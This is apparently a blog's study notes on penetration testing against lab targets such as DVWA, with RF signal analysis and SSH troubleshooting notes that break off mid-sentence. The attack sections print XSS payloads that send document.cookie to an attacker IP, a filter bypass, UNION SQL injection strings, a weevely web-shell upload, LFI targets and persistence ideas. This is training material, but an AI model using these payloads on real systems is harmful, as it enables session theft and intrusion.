src="https://i.imgur.com/JiAkG0d.png"></p><p><strong>破解Window root密碼</strong><br>SAM file<br>NTLM hash<br>Net-NTLM 網路上做金鑰交換的地方</p><p><strong>CVE Details</strong><br>可以去追蹤<br>不會有要怎麼利用該漏洞的程式碼<br><strong>Expoitdb</strong><br>可以追蹤漏洞<br>remote code execution(RCE)遠程代碼執行漏洞</p><p><strong>Metasploit</strong><br><a href="https://ithelp.ithome.com.tw/articles/10224527">https://ithelp.ithome.com.tw/articles/10224527</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/fGYsqLW.png"></p><p><img src="https://i.imgur.com/nUGB4m6.png"></p><h2 id="靶機測試-192-168-5-107"><a href="#靶機測試-192-168-5-107" class="headerlink" title="靶機測試(192.168.5.107)"></a>靶機測試(192.168.5.107)</h2><h3 id="NET-config"><a href="#NET-config" class="headerlink" title="NET config"></a>NET config</h3><p>網路要使用橋接介面卡</p><ol><li><p>&lt;資料蒐集&gt;先測試受害機的port有什麼是開啟的<br>使用nmap查看已開啟的port<br><img src="https://i.imgur.com/4YYhxLY.png"><br>可以查看bin裡面有什麼command可以使用<br><img src="https://i.imgur.com/5HngrIj.png"></p></li><li><p>&lt;利用弱點&gt;登入<br>使用SQL Injection去登入</p></li><li><p>使用受害者電腦連回攻擊者電腦<br>可使用下方這兩個去</p></li></ol><ul><li>bash</li><li>netcat</li></ul><ol start="4"><li><p>&lt;資料蒐集&gt;蒐集受害者電腦資訊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname-a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/W7DQDcI.png"></p></li><li><p>&lt;弱點掃描&gt;使用exploitsdb查詢漏洞<br> <img src="https://i.imgur.com/IajKmAT.png"></p><p> <img src="https://i.imgur.com/BFOaibq.png"></p></li><li><p>在本地電腦開啟apache服務<br> <img src="https://i.imgur.com/6Cimn6A.png"><br> 開啟畫面如下<br> <img src="https://i.imgur.com/TZk5bR6.png"><br> 將需要的檔案放進apache資料夾中，使得之後受害電腦可以下載apache中的資料<br> <img src="https://i.imgur.com/AO8UQ2n.png"><br> <img src="https://i.imgur.com/Pe9lYUr.png"></p></li><li><p>&lt;利用漏洞&gt;在受害者電腦中下載漏洞檔案<br> 使用pwd確認位址指向tmp<br> (由於權限不足因此需要找一個當前權限可以讀寫的位址)<br> 使用wget下載本機開啟的apache<br> <img src="https://i.imgur.com/RdeYP6B.png"><br> <img src="https://i.imgur.com/wVEsi1U.png"><br> 確認權限<br> <img src="https://i.imgur.com/oc9Q7jV.png"></p></li></ol><h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>使用weevely生成backdoor.php<br><img src="https://i.imgur.com/perGeXy.png"><br>將檔案上傳回dvwa的網站<br><img src="https://i.imgur.com/uZlHxZq.png"><br>使用weevely連到該上傳路徑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://IP/dvwa/hackable/uploads/backdoor.php pwd(密碼)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/PkDJBTn.png"><br>查看開主機狀態<br><img src="https://i.imgur.com/L9KupbP.png"></p><p>&lt;中等難度&gt;<br>前端會擋非image會擋<br>先將惡意檔案改成.jpeg</p><p>上傳該檔案，使用burp suite攔截封包，並將封包內檔名更改為php即可<br><img src="https://i.imgur.com/DKwFDBe.png"></p><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞(LFI)</p><p>敏感檔案:</p><ul><li><strong>&#x2F;etc&#x2F;passwd</strong></li><li><strong>&#x2F;var&#x2F;log&#x2F;auth.log</strong><ul><li>紀錄哪些user連這台機器</li></ul></li><li><strong>&#x2F;var&#x2F;log&#x2F;apacke2&#x2F;access.log&#x2F;error.log</strong><ul><li>有出現過哪些錯誤訊息</li></ul></li><li><strong>..&#x2F;..&#x2F;..&#x2F;</strong><ul><li>可以去翻他有那些檔案</li></ul></li><li><strong>%WINDIR%\win.ini</strong><ul><li>win設定檔，可以看config</li></ul></li></ul><p>可以在?page&#x3D;後面放入<strong>絕對路徑</strong>來查找資料<br><img src="https://i.imgur.com/KLw7zdD.png"></p><p><img src="https://i.imgur.com/2pHxd91.png"></p><p><img src="https://i.imgur.com/QGulfsK.png"></p><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>有RFI漏洞<br>需要開啟funcion:</p><ul><li>allow_url_fopen</li><li>allow_url_include</li></ul><p><img src="https://i.imgur.com/DDVoXPL.png"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>跨腳本攻擊(Cross Site Scripting)<br>攻擊對象為user端，非server端</p><p>漏洞利用條件</p><ul><li>伺服器對用戶提交數據過濾不夠嚴謹</li><li>使用社交工程讓受害者點擊觸發<br>影響:</li><li>重定向(掛馬)不應該被倒到的網站</li><li>盜取cookie</li><li>釣魚<br>類型:</li><li>反射型:返回腳本並由user要去點擊才會中招</li><li>儲存型:js code 存在server端，不管user有沒有點擊，都會觸發。</li></ul><p>下js code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;call 911&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/T3rDDKJ.png"><br><img src="https://i.imgur.com/oOGulM2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/191wpbd.png"><br><img src="https://i.imgur.com/0T1ttyT.png"></p><p>從user那邊偷到訊息傳到攻擊者端<br>監聽80 port<br>輸入js code 連到攻擊者IP回傳cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Q0T1jW9.png"></p><p>&lt;中等難度&gt;<br>過濾掉script，則可以使用大小寫來混淆他<br>ex.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCripT&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/sCripT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/4Y4hqwD.png"></p><p><img src="https://i.imgur.com/e26A9bc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>XSS stored</p><p><img src="https://i.imgur.com/gJi4QzR.png"></p><p><img src="https://i.imgur.com/QEBAcB9.png"></p><h2 id="靶機測試2-192-168-0-182"><a href="#靶機測試2-192-168-0-182" class="headerlink" title="靶機測試2(192.168.0.182)"></a>靶機測試2(192.168.0.182)</h2><ol><li>蒐集資料<br>使用dirb蒐集網頁資料</li></ol><p>使用nmap -A 查看該主機有甚麼Port是開啟的<br><img src="https://i.imgur.com/M19pxyW.png"><br>其中可以朝samba掃描&#x2F;攻擊<br>(samba的洞挺多的)</p><ol start="2"><li><p>開啟msfconsolse<br><img src="https://i.imgur.com/zXZNme2.png"></p></li><li><p>Search samba漏洞<br><img src="https://i.imgur.com/4FDBxJQ.png"></p></li><li><p>編譯漏洞腳本<br><img src="https://i.imgur.com/4LaDpTB.png"></p></li><li><p>執行漏洞腳本<br><img src="https://i.imgur.com/97zdWV8.png"><br>(即可連進去取得root)</p></li></ol><p>要怎麼維持連線程序????<br><strong>越貼近使用者行為越好越難發現</strong><br>1.建一個新的帳號<br>2.爆破它其他的帳號密碼<br>3.塞一個服務 (但有可能會被AD斷掉)<br>4.建一個連線回到自己主機 (但有可能會被AD斷掉)</p><p>How To Create a Sudo User in Linux?<br><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart">https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart</a></p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>攔截修改密碼的頁面<br><img src="https://i.imgur.com/FUBku23.png"></p><p>複製封包的URI<br><img src="https://i.imgur.com/1LTXzYP.png"></p><p>執行URI即可更改密碼<br><img src="https://i.imgur.com/POuyWXz.png"><br>將URI拿去縮短網址就能夠更加隱蔽</p><h3 id="XSS-CSRF-組合技"><a href="#XSS-CSRF-組合技" class="headerlink" title="XSS+CSRF 組合技"></a>XSS+CSRF 組合技</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=&quot;更改密碼的URI&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>反射型:點到這個圖片就會被更改</li><li>儲存型:登入後帶著cookie瀏覽到特定圖片就會被更改</li></ul><h3 id="SQL-Injection-脫庫"><a href="#SQL-Injection-脫庫" class="headerlink" title="SQL Injection(脫庫)"></a>SQL Injection(脫庫)</h3><p>server端並未經過過濾使用輸入SQL語法進行解析並將結果返回<br>SQL基礎使用:</p><ul><li>Select DB</li><li>Select table</li><li>Select column</li><li>Data</li></ul><p>登入DB</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h IP</span><br><span class="line">show DB;</span><br><span class="line">use dvwa;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/aK34Mju.png"><br><img src="https://i.imgur.com/pmUsGxs.png"></p><p>select<br><img src="https://i.imgur.com/2ljNhS8.png"><br><img src="https://i.imgur.com/dmWdah5.png"></p><p>Information Schema</p><ul><li>Information_schema.schemata 所有db</li><li>Information_schema.tables 所有table</li><li>Information_schema.columns 所有的欄位</li></ul><p><img src="https://i.imgur.com/Adjm06U.png"><br><img src="https://i.imgur.com/f6uOTKJ.png"></p><p>輸入1會產生ID1的資訊<br><img src="https://i.imgur.com/kpFZTul.png"><br>因此可以使用select語法輸入所有的db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, schema_name from information_schema.schemata # </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/iQecQTk.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables # </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/O5Ba3HO.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables where table_name=&#x27;dvwa&#x27;# </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/sLCOQpN.png"></p><p><img src="https://i.imgur.com/mRMPxDH.png"></p><p><img src="https://i.imgur.com/9QEBR9x.png"></p><hr><h2 id="好用資源"><a href="#好用資源" class="headerlink" title="好用資源"></a>好用資源</h2><ul><li>Payload All The Things<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li><li>GTFObins: 各種Reverse Shell<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li><li>XSS Bypass Filter<br><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a></li></ul><hr><h2 id="RF-滲透測試"><a href="#RF-滲透測試" class="headerlink" title="RF 滲透測試"></a>RF 滲透測試</h2><p>安裝基本套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnuradio </span><br><span class="line">sudo apt-get install gr-osmosdr</span><br><span class="line">sudo apt-get install rtl-sdr</span><br><span class="line">rtl_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Dpat9WW.png"></p><p><strong>開啟osmocom_fft</strong><br>osmocom_fft<br><img src="https://i.imgur.com/Ewe4E1Y.png"></p><h3 id="通訊概論"><a href="#通訊概論" class="headerlink" title="通訊概論"></a>通訊概論</h3><p>訊號：</p><ul><li>類比訊號(陸譯:模擬訊號):根據震幅的改變而產生的訊號，可以用來乘載訊號<ul><li>赫茲(Hz):每秒震盪幾次</li></ul></li><li>數位訊號:表示為0or1，不是用來乘載訊息的</li></ul><p>頻率:每秒震盪幾次，每秒周期數<br>頻寬:用來描述頻率的範圍，又稱為帶寬</p><p>fft 演算法:</p><ul><li>中心頻率(Center Frequency):(f max + f min)&#x2F;2</li><li>頻寬(Bandwideth, channel width): |f max- f min|</li></ul><p>頻譜分配:<br><img src="https://i.imgur.com/YFYcJnm.png"></p><p>ISM頻段:</p><ul><li>無需使用執照與向政府繳交費用</li><li>2.4GHz, 868Mhz</li></ul><p>Sub -1G頻段:</p><ul><li>小於1GHz的頻段被稱為Sub -1GHz</li></ul><p>發收端:調變-&gt;訊息X載波&#x3D;訊號<br>接收端:解調變</p><ul><li>類比調變<ul><li>頻率調變(FM):利用訊號頻率密度來表示</li><li>振幅調變(AM):利用訊號震幅高低表示</li><li>相位調變(PM):利用不同的相位(角度)來表示</li></ul></li><li>數位調變<ul><li>振幅偏移調變(ASK)</li><li>頻率偏移調變(FSK)</li><li>相位偏移調變(PSK)</li><li>正交分多工調變(OFDM) ex.WiFi</li></ul></li><li>比較<br>  <img src="https://i.imgur.com/dY7rAqQ.jpg"></li></ul><p>單工:純接收、純發射<br>半雙工:接收發射同時間下能擇一 ex.無線電<br>雙工:同時間下能透發射&amp;接收 ex.手機</p><p>電流:<br>導體上的電流 - 發射機(Tx) -&gt; air interface -&gt; 接收機(Rx) - 導體上的電流</p><p>Wireless IC Dongle<br><img src="https://i.imgur.com/1ZEd9lh.jpg"><br>SDR Flatforms<br><img src="https://i.imgur.com/W28jivl.jpg"></p><p>Wireless IC Dongle VS SDR Flatforms</p><ul><li>Wireless IC Dongle:收到訊號以後，將已解調訊號傳至電腦</li><li>SDR Flatforms:收到訊號以後，將未解調訊號傳至電腦</li></ul><p>增益VS損耗</p><ul><li>增益(Gain):輸出的訊號&gt;輸入的訊號 ,根據質量守恆定理，訊號不會無緣無故變大，因此會經過電流加大訊號</li><li>損耗(Loss):輸入的訊號&gt;輸出的訊號 ,透過發熱進行能量守恆的轉換</li></ul><p>使用分貝當作比較的條件</p><p>採樣定理:<br>將一個類比訊號經過採樣轉換成一個數位訊號，需要用幾個點表示一個波?</p><blockquote><p>&lt;fs採樣率  f採樣頻率 B頻寬&gt;</p></blockquote><ol><li>低通採樣定理:採樣率至少為採樣頻率的兩倍<br> fs &#x3D; 2 x f</li><li>帶通採樣定理:採樣率至少為頻寬的兩倍<br> fs &#x3D; 2 x B</li></ol><ul><li><p>抽取(Decimation):降低採樣率</p></li><li><p>內插(Interpolation):提高採樣率</p></li><li><p>混疊現象(Aliasing Effect):會發生在訊號中心頻率+-採樣率的頻率</p></li></ul><p>匹配:</p><ul><li>射頻訊號 阻抗 50 Ω(Ohm）</li><li>視頻訊號 阻抗 75 Ω(Ohm)</li><li>匹配不良:射頻信號會有反射問題，嚴重的話可能會燒掉</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/oKM0usX.png"></p><p>圖中每一個都是功能模組相連<br>NBFM Receive為解調訊號的Seceive，沒有它就不會work<br><img src="https://i.imgur.com/03kHTTz.png"></p><p>開啟一個新的流程圖<br>File&gt;New&gt;WX GUI<br><img src="https://i.imgur.com/zvMNJRR.png"><br>區域介紹<br><img src="https://i.imgur.com/o05gLr3.png"><br>RTL-SDR參數設定<br><img src="https://i.imgur.com/UCRfAXd.png"><br>可以更改變數，使所有和samp_rate之變數全部更改<br><img src="https://i.imgur.com/GgUS5UZ.png"></p><p>將rtl收到的所有訊號存到file<br><img src="https://i.imgur.com/bKGy7Eq.png"><br>給file_sink儲存的位址<br><img src="https://i.imgur.com/gAJTMBu.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inspectrum &lt;file&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Jf8QIdk.png"></p><h3 id="元件"><a href="#元件" class="headerlink" title="元件"></a>元件</h3><p>有源:需要電源運作<br>無源:不須電源運作</p><ul><li><p>放大器:</p><ul><li>三種屬性:增益、噪聲係數、線性<ul><li>Gain:使用dB表示</li><li>噪聲係數:使用dB表示</li><li>線性:失真程度</li></ul></li><li>三類:低噪音、高功率、其他</li></ul></li><li><p>天線</p><ul><li>天線:接收訊號與發射訊號<ul><li>全向天線:全樣都有</li><li>指向天線:只有一個角度</li><li>增益天線:捨去電磁場﹑非功率增益而是方向增益</li><li>主動天線:必含功率增益</li></ul></li><li>頻率:決定天線的大小</li><li>傳播方向:決定天性的形狀<ul><li>全向:全樣都有</li><li>指向:只有一個角度</li></ul></li><li>功率:決定天線的大小</li></ul></li><li><p>濾波器</p><ul><li>已”頻率”劃分不同訊號<br>  <img src="https://i.imgur.com/A44cWOA.jpg"></li><li>頻率響應:超過他的憑率較果會下降</li><li>過濾你不要的頻率</li></ul></li><li><p>混頻器:</p><ul><li>改變訊號頻率，但保持其他特性，也就是做調變的功能</li><li>通常混頻器後面會接一個濾波器</li><li>比較沒辦法數位化</li></ul></li><li><p>振盪器:</p><ul><li>比較沒辦法數位化</li></ul></li><li><p>元件比較<br>  <img src="https://i.imgur.com/sQIJs7D.jpg"></p></li><li><p>元件溝通</p><ul><li><p>發射機<br>  <img src="https://i.imgur.com/DrcyGdD.jpg"></p></li><li><p>接收機</p></li></ul></li></ul><h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h3><p>流程:</p><ol><li>Find the signal</li><li>Capture the signal</li><li>Analyze the signal</li></ol><h4 id="Analyze-the-signal"><a href="#Analyze-the-signal" class="headerlink" title="Analyze the signal:"></a>Analyze the signal:</h4><ul><li>前導碼(Preamble):告訴雙方要準備連線了<ul><li>常見的的:0xaaaa, 0x5555</li></ul></li><li>同步碼(Sync Word):我現在開始要傳資料了喔!<ul><li>堂見的:0xd391</li></ul></li></ul><p><img src="https://i.imgur.com/naYlFWK.png"></p><p><img src="https://i.imgur.com/LzH7Dfk.png"></p><blockquote><p>FFT size:調整頻率軸縮放<br>Zoom:調整時間<br>Power Max:調整訊號顯示<br>Power Min:調整背景噪音顯示<br>調整Zoom &amp; FFT size<br><img src="https://i.imgur.com/COKLijI.jpg"></p></blockquote><p><img src="https://i.imgur.com/GEQlM5t.png"><br>讓紅線貼近訊號<br><img src="https://i.imgur.com/MNNMpqH.png"></p><p>可以看見下方的振幅(綠色的線)<br><img src="https://i.imgur.com/aEW6fvE.jpg"></p><h4 id="urh-訊號分析"><a href="#urh-訊號分析" class="headerlink" title="urh 訊號分析"></a>urh 訊號分析</h4><p><img src="https://i.imgur.com/cmzuK6s.png"><br>analysis<br><img src="https://i.imgur.com/aGQYkkS.png"></p><h3 id="分析練習"><a href="#分析練習" class="headerlink" title="分析練習"></a>分析練習</h3><h4 id="Doorball練習"><a href="#Doorball練習" class="headerlink" title="Doorball練習"></a>Doorball練習</h4><p>frequency 240~960MHz</p><p>modulation OOK(One of Key 是ASK的一種) or ASK</p><p>preamble size 0<br>preamble 0x55 or 0xaa</p><p>Sync size 32bits<br>Sync Word 0x80000000</p><p>Packet Structure:<br>Sync+(0x8eee8ee88eee888e888888e88)*39+0x8eee8ee88eee888e888888e8</p><p>了解封包結構以後，接下來就是可以去模擬一個類似的packet structure回傳給IOT裝置，如果原先的訊號沒有過濾需要的值，也就是說在Data的部分更改長度or更改內容，IOT會不會爆掉</p><p>PWM</p><ul><li>高高低1</li><li>高低低0</li><li>PWM 逼碼常與ASK進行調變</li><li>bit rate&#x3D; baud rate &#x2F; 3 &#x3D; symbol rate &#x2F; 3<br>Manchester慢測試</li><li>高電壓到低電壓是0</li><li>低電壓到高電壓是1</li><li>bit rate &#x3D; baud rate &#x2F; 2 &#x3D; symbol &#x2F;2</li></ul><h4 id="Unknow練習"><a href="#Unknow練習" class="headerlink" title="Unknow練習"></a>Unknow練習</h4><ul><li><p>Identify Application</p><ul><li>remote controlled car application</li></ul></li><li><p>Identify Modulation Type</p><ul><li>ASK&#x2F;OOK</li></ul></li><li><p>Identify Preamble</p><ul><li>No</li></ul></li><li><p>Identify Sync Word</p><ul><li>4*W2 or W2都行</li></ul></li><li><p>Identify Encoding</p><ul><li>NRZ (常與ASK做調變 but this case 例外)</li></ul></li><li><p>Identify 4 Signal Function</p><ul><li><img src="https://i.imgur.com/cZLi4qY.png"></li><li>上 w2x4 + w1x10</li><li>下 w2x4 + w1x40</li><li>右 w2x4 + w1x64</li><li>左 w2x4 + w1x58</li></ul></li><li><p>Identify Packet Structure<br><img src="https://i.imgur.com/3oTSfia.png"><br><img src="https://i.imgur.com/GokBAQ8.png"></p></li></ul><h2 id="apache2-server"><a href="#apache2-server" class="headerlink" title="apache2 server"></a>apache2 server</h2><p><strong>Reference</strong><br><a href="https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache">https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache</a><br><a href="https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/">https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/</a></p><ul><li>install<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure></li><li>start<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 start</span><br></pre></td></tr></table></figure></li><li>restart<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li><li>stop<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>📑 DMS_Troubleshooting 筆記</title>
      <link href="/posts/5728fae1.html"/>
      <url>/posts/5728fae1.html</url>
      
        <content type="html"><![CDATA[<h2 id="Network-Debug"><a href="#Network-Debug" class="headerlink" title="Network Debug"></a>Network Debug</h2><ul><li>若你SSH不到Server，你會怎麼做?<ul><li>先Ping Server看通不通</li><li>若還是錯誤則是根據SSH連線出現的錯誤訊息來做故障排除</li><li><strong>Unable to open connection to example.com Host does not exist</strong><ul><li>檢查是否可透過 <code>ping</code> 來去解析目標server域名</li><li>若使用hostname則改用ip試試看(交替試試看)</li></ul></li><li><strong>Connection timed out</strong>: client試圖與SSH Server建立network socket，但server在時間內沒能回應<ul><li>檢查是否正在使用Port 22，或自定義的port口來進行連接<ul><li><code>$ netstat -all</code></li></ul></li><li>檢查firewall規則是否有阻擋來自特定ip或port 22的進入流量<ul><li><code>$ iptables --list</code></li><li>看是不是有設定<strong>Drop</strong> method</li><li>或是port 22 沒有被加進allow connection內</li></ul></li></ul></li><li><strong>Connection Refused</strong>: 請求正在路由到host，但host沒能接收到請求<ul><li>檢查是否正在使用Port 22，或自定義的port口來進行連接</li><li>檢查firewall規則是否有阻擋來自特定ip或port 22的進入流量<ul><li>看是不是有設定<strong>Drop</strong> method</li><li>或是port 22 沒有被加進allow connection內</li><li>檢查服務當前是否正在運行並綁定到預期port上</li></ul></li></ul></li><li>如何檢查防火牆?<ul><li><code>iptable -nL</code></li><li><code>ufw status</code></li></ul></li><li>檢查SSH狀態<ul><li>舊版本的OS可以使用 <code>service</code><ul><li><code>service ssh status</code></li><li>若結果有正確顯示process id則代表正確運行</li><li>若沒有運行則會顯示，ssh stop&#x2F;waiting 之類的訊息</li><li>可透過 <code>service ssh start</code> 開啟服務</li></ul></li><li>新版本的OS可以使用 <code>systemctl</code><ul><li><code>systemctl status sshd</code></li><li>若正確運行，則會顯示active或running</li><li>若沒再運行則會顯示inactive</li><li>可透過 <code>systemctl start sshd</code>來開啟服務</li></ul></li></ul></li><li>檢查SSH Service Port<ul><li>有兩種方式檢查SSH是跑在哪個port上<ul><li>第一個是去查看 ssh 設定檔<ul><li><code>grep Port /etc/ssh/sshd_config</code></li></ul></li><li>若你知道ssh服務正在運行，則可透過 <code>ss</code>指令查看是否跑在預期的port上<ul><li><code>ss -plnt</code> &#x2F;&#x2F;是從kernel中query出socket資訊</li><li><code>netstat -plnt</code></li></ul></li></ul></li></ul></li></ul></li><li>導致SSH連線失敗的原因可能會有哪些?<ul><li><strong>ssh公鑰沒有被inject到Server上</strong><ul><li>我們在本地端產生ssh key pair，並可能透過passphase保護私鑰</li><li>將ssh公鑰注入到遠端server上的 <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong> 路徑</li><li>而有時候常會跳出 <strong>Permission denied (publickey)</strong> 的錯誤訊息<ul><li>原因一: 該私鑰沒有權限登入</li><li>原因二: 公鑰沒有正確被放入路徑或公鑰遺失</li><li>原因三: 本地 ssh 公鑰和私鑰未正確配對</li><li>在連接之前，ssh 會檢查我們的公鑰和私鑰是否正確配對</li></ul></li><li>預設路徑<ul><li><code>$ ssh-keygen</code></li><li>公鑰預設放在 <code>/home/username/.ssh/id_rsa.pub</code></li><li>私鑰預設放在 <code>/home/username/.ssh/id_rsa</code></li></ul></li><li>要如何將公鑰注入至Server路徑中? <ul><li><code>ssh-copy-id USER@HOST</code></li><li>預設就是放入 <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong></li></ul></li></ul></li><li><strong>防火牆導致無法連線</strong><ul><li>檢查Policy</li></ul></li><li><strong>Host Key Check Fails</strong><br>  <img src="https://i.imgur.com/XSDQF9V.png"><br>  出現類似這種錯誤訊息<br>  每個Server都會有Fingerprint，不同server或server重新配置則fingerprint則不同<br>  當成功登入，則電腦會保存fingerprint來為下一次連接做比較，若fingerprint不匹配則會跳出這種警告<ul><li>如果確定有重新設定server則可以忽略這個警告</li><li>可以在 <strong>~&#x2F;.ssh&#x2F;known_hosts</strong> 刪除entry，或清空文件，這將會關閉所有密鑰檢查</li></ul></li><li><strong>Your SSH Key File Mode Issues</strong><ul><li>作為保護 SSH Key檔案的權限應該要是0600(Owner R+W)或0400(Owner R)<br>  <img src="https://i.imgur.com/F9O86LG.png"></li></ul></li></ul></li><li>SSH中要如何啟用無密碼認證?<ul><li>至<code>/etc/ssh/sshd_config</code> 中修改設定  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br><span class="line">PubkeyAuthentication yes</span><br></pre></td></tr></table></figure></li></ul></li><li>講解一下Ping跟Tracert指令是怎麼運作的?<br>  <img src="https://i.imgur.com/Kog8FV8.png"><ul><li>Ping: 向特定目標發送ICMP Echo Request以確認對目的端的通訊狀態<ul><li>可以根據ping返回的TTL值來判斷對方所使用的操作系統及數據包經過路由器數量</li></ul></li><li>Tracert: 善用回應逾時的錯誤以查詢到目的地的路徑</li></ul></li><li><a href="https://www.361way.com/linux-mtu-jumbo-frames/4055.html">Linux底下要怎麼修改MTU值?</a></li><li>甚麼是Jumbo Frame?<ul><li>為比標準Ethernet Frame還大的Frame，比1518&#x2F;1522 bit大的frame</li><li>只能在full-duplex的乙太網路中運行</li><li>標準Ethernet IP訊息大小是: 1500Bit，若包含Ethernet Header以及FCS(6+6+2+4)是1518bit</li><li>Jumbo frame指的是兩層封裝三層IP Message的值大於9000bit的Message</li><li>若使用一般1500Bit的frame，frame越小，傳輸封包量越大，計算量越多，則:<ul><li>增加Host的計算量，消耗CPU資源</li><li>影響網路傳輸速度</li><li>所以加大frame可以降低CPU計算量並加快傳輸速度</li></ul></li></ul></li><li>如何修改frame大小(如何創造Jumbo Frame?)<ul><li>修改MTU(Maximum Transmission Unit)值 </li><li><ol><li><code>ifconfig $&#123;Interface&#125; mtu $&#123;SIZE&#125; up</code></li></ol></li><li>ex. <code>ifconfig eth1 mtu 9000 up</code></li><li>但這樣重啟需要重新設定</li><li><ol start="2"><li>修改config檔案</li></ol></li><li>Ubuntu&#x2F;Debian底下是在 &#x2F;etc&#x2F;network&#x2F;interfaces底下</li><li>新增 